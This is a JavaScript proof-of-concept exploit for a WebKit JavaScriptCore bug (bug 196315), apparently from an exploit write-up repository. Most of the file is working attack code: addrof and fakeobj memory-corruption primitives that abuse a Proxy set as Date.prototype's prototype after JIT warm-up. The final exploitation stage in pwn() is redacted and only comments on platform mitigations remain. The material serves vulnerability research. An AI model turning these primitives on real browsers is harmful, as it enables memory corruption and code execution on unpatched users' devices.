/*
 * Copyright (C) 2019 Alexandro Luongo (w00dl3cs).
 *
 * Bug found by Luca Todesco (qwertyoruiop)
 * Original PoC here: http://rce.party/wtf.js
 */

var datePrototype = undefined;

//
// Exploit primitives
//
// Bug Tracker:     https://bugs.webkit.org/show_bug.cgi?id=196315
// WebKit Commit:   https://github.com/WebKit/webkit/commit/09af07796b44d812d937a4b1b52f8b5442a97cc8
//
// "Structure::create should call didBecomePrototype()"
//
var primitives = {
    addrof: function(obj) {
        let arg = [1.1, 2.2, 3.3];

        let date = new Date();
        date[1] = 1;

        function InfoLeaker(arg) {
            0 in date;
            return arg[0];
        }

        for (var i = 0; i < 10000; ++i)
            InfoLeaker(arg);

        var handler = {
            has: function() {
                arg[0] = obj;
                return false;
            }
        }

        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));

        var addr = InfoLeaker(arg);

        Object.setPrototypeOf(Date.prototype, datePrototype);

        if (addr !== 1.1 && typeof addr !== 'object')
            return Int64.fromDouble(addr);

        throw "Could not leak address using 'addrof' primitive!"
    },
    fakeobj: function(addr) {
        let arg = [1.1, 2.2, 3.3];

        let date = new Date();
        date[1] = 1;

        function ObjFaker(arg) {
            0 in date;
            arg[0] = addr;
        }

        for (var i = 0; i < 10000; ++i)
            ObjFaker(arg);

        var handler = {
            has: function() {
                arg[0] = {};
                return false;
            }
        }

        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));

        ObjFaker(arg);

        Object.setPrototypeOf(Date.prototype, datePrototype);

        var obj = arg[0];

        if (typeof obj === 'object')
            return obj;

        throw "Could not inject fake object using 'fakeobj' primitive!"
    }
};

function pwn() {
    //
    // <redacted>
    //

    //
    // Exploitation process is somehow similar to what described
    // in other write-ups available on this repository.
    //
    // There's few changes to keep in mind, however.
    //
    // Depending on the platform you're testing this script on, in fact,
    // you might (or might not) want to have a look at the following commits
    // on the WebKit repository which introduced a bunch of new mitigations,
    // and modify your exploitation plan accordingly:
    //
    // * WebAssembly Gigacage:      https://github.com/WebKit/webkit/commit/385d20a0e36c9a7db638b26273ddc9c92b573cdc
    // * StructureID randomization: https://github.com/WebKit/webkit/commit/f19aec9c6319a216f336aacd1f5cc75abba49cdf
    //
    // Example: jsc uses both of them, iOS12 none (except for 12.4), and so on.
    //
}

function init() {
    datePrototype = Object.getPrototypeOf(Date.prototype);
}

ready.then(function() {
    try {
        init();
        pwn();
    } catch (e) {
        print("[-] Exception caught: " + e);
    }
}).catch(function(err) {
    print("[-] Initialization failed");
});